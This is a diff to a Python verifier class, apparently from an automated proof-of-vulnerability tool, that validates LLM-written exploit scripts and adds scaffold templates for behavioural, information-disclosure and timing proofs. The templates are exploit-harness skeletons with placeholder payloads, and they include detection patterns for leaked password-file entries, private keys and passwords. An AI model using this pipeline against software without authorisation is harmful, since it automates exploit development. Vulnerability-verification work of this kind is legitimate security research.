+                    f"CRITICAL BUG: You used '{pattern}' in the script but '{req_imp}' is missing. "
+                    f"This causes NameError or AttributeError at runtime. "
+                    f"FIX: Add '{req_imp}' at the top of your script."
+                )
+
+        # --- 11. String operations on result.stdout/stderr without text=True ---
+        # If text=True is NOT used, result.stdout and result.stderr are bytes.
+        # Comparing with string literals causes TypeError.
+        if not has_text_true and 'subprocess.run(' in script:
+            for line in lines:
+                stripped = line.strip()
+                # Match patterns like: "AddressSanitizer" in result.stderr
+                if re.search(r"['\"].*['\"]\s+in\s+result\.(stdout|stderr)", stripped):
+                    issues.append(
+                        "CRITICAL BUG: You compared a string literal to result.stdout/result.stderr "
+                        "without using text=True in subprocess.run(). When text=True is missing, "
+                        "stdout/stderr are bytes objects. Comparing 'str' to 'bytes' causes TypeError. "
+                        "FIX: Add text=True to subprocess.run(..., capture_output=True, text=True). "
+                        "Then access result.stdout/result.stderr as strings directly."
+                    )
+                    break
+
+        return issues
 
     def _extract_inline_eval_payloads(self, pov_script: str) -> List[str]:
         script = str(pov_script or '')
@@ -462,10 +849,13 @@ class VulnerabilityVerifier:
 
         issues.extend(self._generated_c_harness_escaping_issues(pov_script))
 
-        # ── Detect TARGET_SYMBOL set to a source filename (not a binary name) ──
+        # ── Detect TARGET_SYMBOL / TARGET_BINARY set to a source filename (not a binary name) ──
         # e.g. TARGET_SYMBOL = 'imgfile' where imgfile.c is the source — the binary is 'jhead'.
         # This causes "binary not found" every time because the glob searches for 'imgfile'.
-        _ts_match = re.search(r"TARGET_SYMBOL\s*=\s*['\"]([^'\"]+)['\"](?!\s*#[^\n]*probe)", pov_script)
+        _ts_match = (
+            re.search(r"TARGET_SYMBOL\s*=\s*['\"]([^'\"]+)['\"](?!\s*#[^\n]*probe)", pov_script)
+            or re.search(r"TARGET_BINARY\s*=\s*['\"]([^'\"]+)['\"](?!\s*#[^\n]*probe)(?!.*os\.environ)", pov_script)
+        )
         if _ts_match:
             _ts_val = _ts_match.group(1).strip()
             # Flag if the value looks like a C/C++ source filename stem (no path sep, no extension,
@@ -473,9 +863,8 @@ class VulnerabilityVerifier:
             _probe_bin_name = str((exploit_contract or {}).get('probe_binary_name') or '').strip()
             if _probe_bin_name and _ts_val and _ts_val != _probe_bin_name:
                 issues.append(
-                    f"TARGET_SYMBOL is '{_ts_val}' but the probe discovered the actual binary is "
-                    f"'{_probe_bin_name}'. Change TARGET_SYMBOL = {_probe_bin_name!r} so the binary "
-                    f"locator finds the correct executable."
+                    f"TARGET_BINARY/TARGET_SYMBOL is '{_ts_val}' but the probe discovered the actual binary is "
+                    f"'{_probe_bin_name}'. Use os.environ.get('TARGET_BINARY') to get the correct path."
                 )
         # Applies to ALL models (online and offline). If a model redeclares TARGET_BINARY,
         # TARGET_BIN, or CODEBASE_PATH as a local variable inside a function, Python treats
@@ -486,6 +875,11 @@ class VulnerabilityVerifier:
             _tree = _ast.parse(pov_script)
             for _func in _ast.walk(_tree):
                 if isinstance(_func, _ast.FunctionDef):
+                    # Collect names declared with `global` — these are safe to assign
+                    _global_declared = set()
+                    for _node in _ast.walk(_func):
+                        if isinstance(_node, _ast.Global):
+                            _global_declared.update(_node.names)
                     _assigns = {
                         n.id for n in _ast.walk(_func)
                         if isinstance(n, _ast.Name) and isinstance(n.ctx, _ast.Store)
@@ -494,18 +888,67 @@ class VulnerabilityVerifier:
                         n.id for n in _ast.walk(_func)
                         if isinstance(n, _ast.Name) and isinstance(n.ctx, _ast.Load)
                     }
-                    _shadowed = _assigns & _reads & _HARNESS_GLOBALS
+                    # Only flag variables that are assigned AND read but NOT declared global
+                    _shadowed = (_assigns & _reads & _HARNESS_GLOBALS) - _global_declared
                     if _shadowed:
                         issues.append(
                             f"PoV shadows harness module-level variable(s) {sorted(_shadowed)} "
                             f"as locals inside function '{_func.name}' — this causes "
-                            "UnboundLocalError. Do NOT redeclare TARGET_BINARY, TARGET_BIN, or "
-                            "CODEBASE_PATH inside any function. Use the module-level variables directly."
+                            "UnboundLocalError. Either use the module-level variable directly "
+                            "or add 'global TARGET_BINARY' at the top of the function."
                         )
         except SyntaxError:
             pass  # syntax errors are caught separately by _validate_pov_script_syntax
         except Exception:
             pass
+
+        # ── Detect missing imports for commonly-used stdlib modules ──────────
+        # The LLM often uses tempfile.mkdtemp(), json.dumps(), etc. but forgets
+        # the import statement, causing NameError at runtime.
+        _STDLIB_MODULES = {
+            'tempfile', 'json', 'struct', 'base64', 'hashlib', 'shutil',
+            'glob', 'pathlib', 'io', 'time', 'random', 'string', 'math',
+            'itertools', 'functools', 'collections', 're', 'socket',
+            'http', 'urllib', 'xml', 'csv', 'gzip', 'zipfile', 'tarfile',
+            'stat',
+        }
+        try:
+            _pov_lines = pov_script.splitlines()
+            # Gather all imported names (import X, from X import Y)
+            _imported = set()
+            for _line in _pov_lines:
+                _stripped = _line.strip()
+                if _stripped.startswith('import '):
+                    # import os, sys, tempfile
+                    for _part in _stripped[7:].split(','):
+                        _mod = _part.strip().split('.')[0].split(' ')[0]
+                        if _mod:
+                            _imported.add(_mod)
+                elif _stripped.startswith('from '):
+                    # from tempfile import mkdtemp
+                    _mod = _stripped[5:].split()[0].split('.')[0]
+                    if _mod:
+                        _imported.add(_mod)
+            # Find modules used but not imported (e.g. tempfile.mkdtemp())
+            import re as _re_imp
+            _used_modules = set(_re_imp.findall(r'\b(' + '|'.join(_STDLIB_MODULES) + r')\.', pov_script))
+            _missing = _used_modules - _imported
+            if _missing:
+                issues.append(
+                    f"PoV uses {', '.join(sorted(_missing))} but does not import "
+                    f"{'it' if len(_missing) == 1 else 'them'}. Add: import {', '.join(sorted(_missing))}"
+                )
+        except Exception:
+            pass
+
+        # ── Detect incorrect tempfile API usage ─────────────────────────────
+        # tempfile.tempdir is an attribute (str|None), NOT a callable.
+        # Models sometimes write tempfile.tempdir() which always fails.
+        if 'tempfile.tempdir()' in pov_script:
+            issues.append(
+                'PoV calls tempfile.tempdir() but tempfile.tempdir is an attribute, not a function. '
+                'Use tempfile.mkdtemp() to create a temporary directory.'
+            )
 
         # Task 4B: C library harness guardrails
         # When repo_surface_class=library_c or execution_surface=c_library_harness,
@@ -521,7 +964,7 @@ class VulnerabilityVerifier:
             or str((exploit_contract or {}).get('probe_binary_name') or '').strip()
             or str((exploit_contract or {}).get('target_binary') or '').strip()
         )
-        if (_repo_surf == 'library_c' or _exec_surf == 'c_library_harness') and not _has_binary:
+        if (_repo_surf in ('library_c', 'library_c_with_cli') or _exec_surf == 'c_library_harness') and not _has_binary:
             # Must contain a compile step (clang/gcc invocation)
             if not re.search(r'\b(clang|gcc)\b.*-fsanitize', lower_script):
                 issues.append(
@@ -859,8 +1302,10 @@ class VulnerabilityVerifier:
             execution_surface = 'http_request'
         elif probe_surface == 'native_elf' and not execution_surface:
             execution_surface = 'binary_cli'
+        elif probe_surface == 'java_module' and not execution_surface:
+            execution_surface = 'repo_script'
         # If probe resolved a surface, treat missing oracle/surface fields as warnings not blockers
-        _probe_resolved_surface = probe_surface in {'python_module', 'node_module', 'web_service', 'native_elf'}
+        _probe_resolved_surface = probe_surface in {'python_module', 'node_module', 'web_service', 'native_elf', 'java_module'}
 
         if not runtime_family:
             issues.append('Exploit contract is missing a runtime family')
@@ -900,14 +1345,34 @@ class VulnerabilityVerifier:
                     and not binary_candidates
                     and not observed_target_binary
                     and not str((exploit_contract or {}).get('probe_binary_path') or '').strip()
+                    and (
+                        # Explicit library indicators — must have one of these
+                        # to be treated as a library target rather than a CLI tool
+                        # with a missing binary (which is a hard blocker).
+                        str((exploit_contract or {}).get('execution_surface') or '').lower() in ('c_library_harness', 'function_call')
+                        or str((exploit_contract or {}).get('repo_surface_class') or '').lower() in ('library_c', 'library_c_with_cli')
+                        or str((exploit_contract or {}).get('probe_binary_is_example') or '') == '1'
+                        or str((exploit_contract or {}).get('probe_surface_type') or '').lower() in ('c_library', 'python_module', 'node_module')
+                    )
                 )
-                if _is_library_target:
+                # Also treat c_library_harness execution surface or library repo surface as library target
+                _repo_cls_gate = str((exploit_contract or {}).get('repo_surface_class') or '').strip().lower()
+                _exec_surf_gate = str((exploit_contract or {}).get('execution_surface') or '').strip().lower()
+                if _is_library_target or _repo_cls_gate in ('library_c', 'library_c_with_cli') or _exec_surf_gate == 'c_library_harness':
                     warnings.append(
                         'No prebuilt binary found for native target — will attempt function-harness generation; '
                         'verify that target_entrypoint resolves to a real symbol'
                     )
                 else:
                     issues.append('Native proof plan is missing a concrete binary or entrypoint for the next proof stage')
+            # Task 3: When target_entrypoint is unknown BUT a binary was found by the probe,
+            # demote from blocker to warning — the PoV can still exercise the binary
+            # with crafted input and the oracle can confirm via crash/ASan/behavioral evidence.
+            elif target_entrypoint in {'', 'unknown', 'none', 'n/a'} and (binary_candidates or observed_target_binary):
+                warnings.append(
+                    'target_entrypoint is unknown but a binary was found — '
+                    'proceeding with binary-level PoV (will exercise the binary with crafted input)'
+                )
             if observed_target_binary and self._source_like_target(observed_target_binary):
                 issues.append('Observed native target resolves to a source file instead of a built executable')
         elif execution_surface == 'function_call':
@@ -934,6 +1399,15 @@ class VulnerabilityVerifier:
             warnings.append('Exploit contract does not include explicit success indicators beyond the proof-plan oracle')
         if not requirements['preflight_checks']:
             warnings.append('Proof plan does not define any preflight checks')
+
+        # Warn (but don't block) when pre-gen oracle is missing but probe resolved surface
+        _has_oracle = bool(
+            _contract_dict.get('success_indicators')
+            or _contract_dict.get('expected_outcome')
+            or (_contract_dict.get('proof_plan') or {}).get('oracle')
+        )
+        if not _has_oracle and _probe_resolved_surface:
+            warnings.append('contract missing pre-gen oracle but probe resolved surface — proceeding with defaults')
 
         return {
             'is_ready': not issues,
@@ -970,19 +1444,69 @@ class VulnerabilityVerifier:
 
         # Per-family required fields
         if family in {'native', 'c', 'cpp', 'binary'}:
-            # Any one of three valid native targets is sufficient:
+            # Any one of four valid native targets is sufficient:
             #   1. A resolved function entrypoint
             #   2. A concrete target_binary
             #   3. execution_surface == 'function_harness'
+            #   4. execution_surface == 'c_library_harness' (inline harness, no binary needed)
             has_ep = entrypoint not in _INVALID
-            has_binary = bool(str(contract.get('target_binary') or '').strip())
-            has_harness = contract_surface == 'function_harness'
-            if not has_ep and not has_binary and not has_harness:
+            # Task 5 (Gap 5): Also check probe_binary_path and probe_binary_name,
+            # not just target_binary, since probe stores its discovery there.
+            # Also check binary_candidates from proof_plan — the normalize step
+            # populates this and downstream gates should honour it.
+            _bc = [
+                str(x).strip()
+                for x in self._coerce_listish(
+                    (contract.get('proof_plan') or {}).get('binary_candidates')
+                )
+                if str(x).strip() and str(x).strip().lower() not in _INVALID
+            ]
+            # Also check proof_plan_json.target_binary — the LLM often
+            # identifies the target binary even when probe results were lost
+            # during the refinement phase (e.g. cJSON_test for cJSON library).
+            _ppj_tb = str((contract.get('proof_plan_json') or {}).get('target_binary') or '').strip()
+            has_binary = bool(
+                str(contract.get('target_binary') or '').strip()
+                or str(contract.get('probe_binary_path') or '').strip()
+                or str(contract.get('probe_binary_name') or '').strip()
+                or _bc  # binary_candidates also indicates an available binary
+                or (_ppj_tb and _ppj_tb.lower() not in _INVALID)  # LLM-identified target binary
+            )
+            # Last-resort heuristic: if the probe observed help text that starts
+            # with "<name>:" (e.g. "enchive: missing command"), the binary name
+            # can be extracted from it.  This covers the case where probe results
+            # are not propagated to the contract by the refinement phase.
+            if not has_binary:
+                _obs_surf = (contract.get('runtime_feedback') or {}).get('observed_surface') or {}
+                _help = str(_obs_surf.get('help_text') or '').strip()
+                if _help:
+                    import re as _re
+                    _m = _re.match(r'^([A-Za-z0-9_.-]+):\s', _help)
+                    # Filter out common help-text section labels that are NOT binary names
+                    _HELP_LABELS = {'commands', 'usage', 'options', 'arguments', 'description',
+                                    'examples', 'flags', 'subcommands', 'version', 'synopsis'}
+                    if _m and _m.group(1).lower() not in _INVALID and _m.group(1).lower() not in _HELP_LABELS:
+                        has_binary = True
+            has_harness = contract_surface in {'function_harness', 'c_library_harness'}
+            # Also check repo_surface_class — library repos with no binary are expected
+            _repo_cls = str(contract.get('repo_surface_class') or '').strip().lower()
+            has_library_surface = _repo_cls in {'library_c', 'library_c_with_cli'}
+            if not has_ep and not has_binary and not has_harness and not has_library_surface:
                 blocking.append(
                     'native target: target_entrypoint, target_binary, and execution_surface '
                     'are all unresolved — cannot generate a targeted PoV'
                 )
         elif family in {'python', 'node', 'java', 'javascript'}:
+            # Server-side XSS on node/python targets should use repo_script (HTTP requests)
+            # not browser_dom (which requires a headless browser the image may lack).
+            # Auto-downgrade browser_dom to repo_script for these families.
+            _pp_surf = str(plan.get('execution_surface') or '').strip().lower()
+            if _pp_surf == 'browser_dom' and family in {'node', 'python', 'javascript'}:
+                plan['execution_surface'] = 'repo_script'
+                plan['input_mode'] = plan.get('input_mode') or 'http_request'
+                if not plan.get('oracle'):
+                    plan['oracle'] = ['behavioral_deviation']
+                logger.info('[contract_gate] Downgraded browser_dom -> repo_script for %s target', family)
             if entrypoint in _INVALID:
                 # For repo_script execution surface, a concrete entrypoint is not strictly
                 # required — the PoV can import and test at module level.  Only block for
@@ -1033,9 +1557,20 @@ class VulnerabilityVerifier:
             or plan.get('oracle')  # legacy field name — also accepted
         )
         if not has_pre_gen_oracle:
-            blocking.append(
-                'contract is missing a pre-generation success signal — '
-                'set success_indicators or expected_outcome before PoV generation'
+            _probe_surf = str(contract.get('probe_surface_type') or '').lower()
+            _probe_resolved = _probe_surf in {'python_module', 'node_module', 'web_service', 'native_elf', 'java_module'}
+            if not _probe_resolved:
+                blocking.append(
+                    'contract is missing a pre-generation success signal — '
+                    'set success_indicators or expected_outcome before PoV generation'
+                )
+            # else: demoted to warning — probe resolved surface provides implicit oracle
+
+        if blocking:
+            import logging as _gate_log
+            _gate_log.getLogger('autopov.contract_gate').warning(
+                f"[GATE_BLOCK] family={family} surface={contract_surface} "
+                f"blocking={blocking}"
             )
 
         return blocking
@@ -1058,8 +1593,16 @@ class VulnerabilityVerifier:
         if not plan or not isinstance(plan, dict):
             return ['proof plan is missing or not a JSON object']
 
-        _SUBSTRING_PLACEHOLDERS = {'/path/to/', '<binary>', 'placeholder', 'unknown'}
-        _UNFILLED_TOKENS = {'<arg1>', '<arg2>', '<payload>', '<binary>', '/path/to/'}
+        _SUBSTRING_PLACEHOLDERS = {
+            '/path/to/', '<binary>', 'placeholder', 'unknown',
+            'replace_me', 'your_binary', 'your_path', 'insert_',
+            'todo:', 'fixme:',
+        }
+        _UNFILLED_TOKENS = {
+            '<arg1>', '<arg2>', '<payload>', '<binary>', '/path/to/',
+            '<target>', '<input>', '<file>', '<command>', '<url>',
+            'REPLACE_ME', 'YOUR_BINARY_HERE', 'INSERT_PATH_HERE',
+        }
 
         # Derive context needed to scope the target_binary requirement
         contract = exploit_contract or {}
@@ -1174,6 +1717,13 @@ class VulnerabilityVerifier:
                     f'{a[:20]!r}... alongside other scaffold tokens'
                 )
                 break
+
+        # Angle-bracket placeholder catch-all: <FOO_BAR> patterns the model left unfilled
+        import re as _re_ph
+        _plan_str = str(plan)
+        _angle_bracket_placeholders = _re_ph.findall(r'<[A-Z_]{3,}>', _plan_str)
+        if _angle_bracket_placeholders:
+            issues.append(f'proof plan: possible unfilled placeholders: {_angle_bracket_placeholders[:5]}')
 
         # Subcommand enforcement for binary_cli native surfaces.
         # Only fires when known_subcommands is set on the contract (evidence-driven).
@@ -1476,7 +2026,7 @@ class VulnerabilityVerifier:
 
         native_sig_patterns = [
             r'\b(?:static\s+)?(?:inline\s+)?(?:const\s+)?(?:struct\s+)?(?:[A-Za-z_]\w*\s+)*[A-Za-z_]\w*(?:\s*\*+)?\s+([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{',
-            r'\b([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{',
+            r'\b(?!if|else|while|for|do|switch|case|default|return|break|continue|goto|sizeof|typeof|struct|enum|union|void|class|namespace|try|catch|throw|new|delete|this|virtual|inline|extern|static|const|volatile|register|typedef|signed|unsigned|short|long|double|float|int|char|bool|auto|wchar_t\b)([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{',
         ]
         for pat in native_sig_patterns:
             for m in re.finditer(pat, code):
@@ -1526,7 +2076,135 @@ class VulnerabilityVerifier:
         return best if best.lower() not in self.NATIVE_INVALID_ENTRYPOINTS else 'unknown'
 
 
-    def _static_extract_enclosing_function(self, codebase_path: str, filepath: str, line_number: int) -> str:
+    @staticmethod
+    def _extract_enhanced_context(codebase_path: str, exploit_contract: Dict[str, Any], finding_filepath: str) -> str:
+        """IMPROVEMENT 2.1: Extract test cases, binary info, and build details.
+        
+        Provides richer context for PoV generation including:
+        - Existing test files that demonstrate vulnerabilities
+        - Compiled binaries and their locations
+        - Build configuration details
+        - Sample input files
+        """
+        if not codebase_path or not os.path.isdir(codebase_path):
+            return ''
+        
+        context_parts = []
+        
+        # 1. Find test files related to the vulnerable file
+        try:
+            finding_basename = os.path.splitext(os.path.basename(finding_filepath))[0]
+            test_patterns = [
+                f'*test*{finding_basename}*',
+                f'*{finding_basename}*test*',
+                f'*{finding_basename}*',
+            ]
+            test_files_found = []
+            for root, dirs, files in os.walk(codebase_path):
+                # Skip non-source directories
+                dirs[:] = [d for d in dirs if d.lower() not in {'node_modules', '.git', 'build', 'vendor'}]
+                for f in files:
+                    if 'test' in f.lower() and finding_basename.lower() in f.lower():
+                        full_path = os.path.join(root, f)
+                        test_files_found.append(full_path)
+                        if len(test_files_found) >= 3:
+                            break
+                if len(test_files_found) >= 3:
+                    break
+            
+            if test_files_found:
+                context_parts.append('=== RELATED TEST FILES ===')
+                for tf in test_files_found[:2]:  # Show first 2 test files
+                    rel_path = os.path.relpath(tf, codebase_path)
+                    try:
+                        with open(tf, 'r', encoding='utf-8', errors='ignore') as fh:
+                            content = fh.read(800)  # First 800 chars
+                            context_parts.append(f'File: {rel_path}')
+                            context_parts.append(content)
+                            context_parts.append('')
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        
+        # 2. Find compiled binaries
+        try:
+            binary_extensions = {'.exe', '.out', ''}  # Empty for Linux binaries
+            binaries_found = []
+            for root, dirs, files in os.walk(codebase_path):
+                dirs[:] = [d for d in dirs if d.lower() not in {'.git', 'node_modules'}]
+                for f in files:
+                    full_path = os.path.join(root, f)
+                    # Check if file is executable
+                    if os.access(full_path, os.X_OK) and not os.path.isdir(full_path):
+                        # Skip scripts and libraries
+                        if not f.endswith(('.sh', '.py', '.js', '.so', '.a', '.dylib')):
+                            binaries_found.append(full_path)
+                            if len(binaries_found) >= 5:
+                                break
+                if len(binaries_found) >= 5:
+                    break
+            
+            if binaries_found:
+                context_parts.append('=== COMPILED BINARIES FOUND ===')
+                for bf in binaries_found[:5]:
+                    rel_path = os.path.relpath(bf, codebase_path)
+                    size = os.path.getsize(bf)
+                    context_parts.append(f'- {rel_path} ({size/1024:.1f} KB)')
+                context_parts.append('')
+        except Exception:
+            pass
+        
+        # 3. Find sample/example input files
+        try:
+            sample_extensions = {'.txt', '.bin', '.xml', '.json', '.png', '.jpg', '.jpeg', '.gif', '.tar', '.gz'}
+            samples_found = []
+            for root, dirs, files in os.walk(codebase_path):
+                # Focus on test/example directories
+                if any(d in root.lower() for d in ['test', 'sample', 'example', 'fixture', 'data']):
+                    dirs[:] = [d for d in dirs if d.lower() not in {'.git', 'node_modules'}]
+                    for f in files:
+                        if os.path.splitext(f)[1].lower() in sample_extensions:
+                            full_path = os.path.join(root, f)
+                            if os.path.getsize(full_path) < 1024 * 1024:  # < 1MB
+                                samples_found.append(full_path)
+                                if len(samples_found) >= 5:
+                                    break
+                if len(samples_found) >= 5:
+                    break
+            
+            if samples_found:
+                context_parts.append('=== SAMPLE/TEST INPUT FILES ===')
+                for sf in samples_found[:5]:
+                    rel_path = os.path.relpath(sf, codebase_path)
+                    size = os.path.getsize(sf)
+                    context_parts.append(f'- {rel_path} ({size/1024:.1f} KB)')
+                context_parts.append('These files may be useful as input templates for crafting malformed payloads.')
+                context_parts.append('')
+        except Exception:
+            pass
+        
+        # 4. Extract build configuration hints
+        try:
+            cmake_path = os.path.join(codebase_path, 'CMakeLists.txt')
+            if os.path.exists(cmake_path):
+                with open(cmake_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    cmake_content = f.read(1000)
+                    # Extract add_executable and target names
+                    import re
+                    executables = re.findall(r'add_executable\s*\(\s*(\S+)', cmake_content)
+                    if executables:
+                        context_parts.append('=== CMAKE EXECUTABLES ===')
+                        context_parts.append(f'Target binaries: {", ".join(executables[:5])}')
+                        context_parts.append('')
+        except Exception:
+            pass
+        
+        return '\n'.join(context_parts) if context_parts else ''
+
+
+    @staticmethod
+    def _static_extract_enclosing_function(codebase_path: str, filepath: str, line_number: int) -> str:
         """Walk backward from `line_number` in the actual source file to find the
         enclosing C/C++ function name using a pure-regex scan.  This is deterministic
         and LLM-free, so it is used for CodeQL findings where the function name
@@ -1567,11 +2245,13 @@ class VulnerabilityVerifier:
         )
         search_start = min(line_number - 1, len(lines) - 1)
         main_fallback = ''
+        # Invalid entry points to skip (local copy for static method)
+        invalid_entrypoints = {'if', 'for', 'while', 'switch', 'catch', 'else', 'do', 'return', 'sizeof', 'typeof', 'defined'}
         for i in range(search_start, max(search_start - 200, -1), -1):
             m = func_sig_re.match(lines[i])
             if m:
                 name = m.group(1)
-                if name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
+                if name.lower() not in invalid_entrypoints:
                     if name == 'main':
                         main_fallback = 'main'
                         continue  # keep scanning; prefer a named function over main
@@ -1586,6 +2266,298 @@ class VulnerabilityVerifier:
             '<script', 'javascript:', 'document.cookie', 'window.location', 'settimeout(', 'setinterval(',
         ]
         return any(marker in combined for marker in dom_markers)
+
+    # ── Task 2: PoV scaffold templates for non-crash CWEs ────────────────────
+    _POV_SCAFFOLDS = {
+        'behavioral_deviation': '''import os, subprocess, sys, stat, tempfile
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found: ' + repr(binary) + '\\n')
+        return 1
+
+    # --- 1. Set up pre-conditions ---
+    workdir = tempfile.mkdtemp(prefix='autopov_beh_')
+    crafted_input = os.path.join(workdir, 'input.dat')
+    with open(crafted_input, 'wb') as f:
+        f.write(b'AAAA')  # TODO: replace with exploit-specific input
+
+    # --- 2. Run the target binary ---
+    result = subprocess.run(
+        [binary, crafted_input],  # TODO: adjust argv for this vulnerability
+        capture_output=True, text=True, timeout=30,
+        cwd=workdir,
+    )
+    stdout = result.stdout or ''
+    stderr = result.stderr or ''
+
+    # --- 3. POST-EXECUTION VERIFICATION ---
+    # Check filesystem state, permissions, output content
+    for root, dirs, files in os.walk(workdir):
+        for fname in files:
+            fpath = os.path.join(root, fname)
+            st = os.stat(fpath)
+            mode = stat.S_IMODE(st.st_mode)
+            if mode & 0o002:  # world-writable
+                print(f'INSECURE_PERMISSION:{oct(mode)}:{fpath}')
+
+    # Check for path traversal / escaped writes
+    suspect_paths = ['/tmp/escaped_file', '/etc/cron.d/malicious']
+    for sp in suspect_paths:
+        if os.path.exists(sp):
+            print(f'FILE_CREATED_OUTSIDE_ALLOWED_DIR:{sp}')
+
+    # Check output for sensitive data leakage
+    if 'root:' in stdout or '/etc/passwd' in stdout:
+        print('SENSITIVE_DATA_LEAKED')
+
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+
+        'state_change': '''import os, subprocess, sys, tempfile, hashlib
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def snapshot_dir(path):
+    """Capture filesystem state for comparison."""
+    state = {}
+    for root, dirs, files in os.walk(path):
+        for fname in files:
+            fpath = os.path.join(root, fname)
+            try:
+                st = os.stat(fpath)
+                state[fpath] = {'size': st.st_size, 'mode': oct(st.st_mode)}
+            except OSError:
+                pass
+    return state
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found\\n')
+        return 1
+
+    workdir = tempfile.mkdtemp(prefix='autopov_sc_')
+
+    # --- 1. Capture PRE-state ---
+    pre_state = snapshot_dir(workdir)
+
+    # --- 2. Run exploit ---
+    crafted = os.path.join(workdir, 'payload.dat')
+    with open(crafted, 'wb') as f:
+        f.write(b'EXPLOIT_DATA')  # TODO: craft exploit payload
+    result = subprocess.run(
+        [binary, crafted],
+        capture_output=True, text=True, timeout=30, cwd=workdir,
+    )
+    stdout = result.stdout or ''
+    stderr = result.stderr or ''
+
+    # --- 3. Capture POST-state and compare ---
+    post_state = snapshot_dir(workdir)
+    new_files = set(post_state.keys()) - set(pre_state.keys())
+    for nf in new_files:
+        print(f'FILE_CREATED_OUTSIDE_ALLOWED_DIR:{nf}')
+
+    # Check for traversal writes outside workdir
+    for suspect in ['/tmp', '/var/tmp', '/etc']:
+        for root, dirs, files in os.walk(suspect):
+            for fname in files:
+                fpath = os.path.join(root, fname)
+                try:
+                    if os.stat(fpath).st_mtime > os.stat(crafted).st_mtime - 2:
+                        print(f'PATH_TRAVERSAL_CONFIRMED:{fpath}')
+                except OSError:
+                    pass
+            break  # only top level
+
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+
+        'information_disclosure': '''import os, subprocess, sys, re, tempfile
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found\\n')
+        return 1
+
+    # --- 1. Craft input that triggers info disclosure ---
+    workdir = tempfile.mkdtemp(prefix='autopov_id_')
+    crafted = os.path.join(workdir, 'probe.dat')
+    with open(crafted, 'wb') as f:
+        f.write(b'PROBE_INPUT')  # TODO: craft disclosure-triggering input
+
+    result = subprocess.run(
+        [binary, crafted],  # TODO: adjust command
+        capture_output=True, text=True, timeout=30,
+    )
+    stdout = result.stdout or ''
+    stderr = result.stderr or ''
+    combined = stdout + stderr
+
+    # --- 2. Check for sensitive data patterns ---
+    sensitive_patterns = [
+        (r'root:.*:0:0:', 'SENSITIVE_DATA_LEAKED'),
+        (r'-----BEGIN.*KEY-----', 'SENSITIVE_DATA_LEAKED'),
+        (r'password\\s*[:=]\\s*\\S+', 'SENSITIVE_DATA_LEAKED'),
+        (r'Traceback \\(most recent call last\\)', 'STACK_TRACE_LEAKED'),
+        (r'at [a-zA-Z0-9_.]+\\([^)]*:\\d+\\)', 'STACK_TRACE_LEAKED'),
+        (r'/home/\\w+/', 'INTERNAL_PATH_DISCLOSED'),
+        (r'Exception in thread', 'STACK_TRACE_LEAKED'),
+    ]
+    for pattern, marker in sensitive_patterns:
+        if re.search(pattern, combined, re.IGNORECASE):
+            print(marker)
+
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+
+        'exception': '''import os, subprocess, sys, tempfile
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found\\n')
+        return 1
+
+    # --- 1. Craft input that triggers exception ---
+    workdir = tempfile.mkdtemp(prefix='autopov_exc_')
+    crafted = os.path.join(workdir, 'exploit.dat')
+    with open(crafted, 'wb') as f:
+        f.write(b'MALFORMED_INPUT')  # TODO: replace
+
+    try:
+        result = subprocess.run(
+            [binary, crafted],
+            capture_output=True, text=True, timeout=30,
+        )
+        stderr = result.stderr or ''
+        # Check for unhandled exceptions
+        if result.returncode != 0 and ('Traceback' in stderr or 'Exception' in stderr):
+            print(f'EXCEPTION_TRIGGERED:returncode={result.returncode}')
+            sys.stderr.write(stderr)
+    except subprocess.TimeoutExpired:
+        print('RESOURCE_EXHAUSTION:timeout')
+
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+
+        'timing_difference': '''import os, subprocess, sys, time, tempfile
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def measure_time(binary, input_data, runs=5):
+    """Measure average execution time over multiple runs."""
+    times = []
+    for _ in range(runs):
+        fd, path = tempfile.mkstemp(prefix='autopov_tm_')
+        os.write(fd, input_data)
+        os.close(fd)
+        t0 = time.monotonic()
+        try:
+            subprocess.run([binary, path], capture_output=True, timeout=30)
+        except subprocess.TimeoutExpired:
+            times.append(30.0)
+        else:
+            times.append(time.monotonic() - t0)
+        os.unlink(path)
+    return sum(times) / len(times) if times else 0.0
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found\\n')
+        return 1
+
+    # --- 1. Baseline: benign input ---
+    benign_time = measure_time(binary, b'normal_input')
+
+    # --- 2. Exploit: crafted slow input (e.g. ReDoS) ---
+    exploit_time = measure_time(binary, b'AAAA' * 1000)  # TODO: craft exploit
+
+    ratio = exploit_time / max(benign_time, 0.001)
+    print(f'TIMING_RATIO:{ratio:.2f}')
+    if ratio > 2.0:
+        print(f'TIMING_ANOMALY:ratio={ratio:.2f}')
+
+    return 0
+
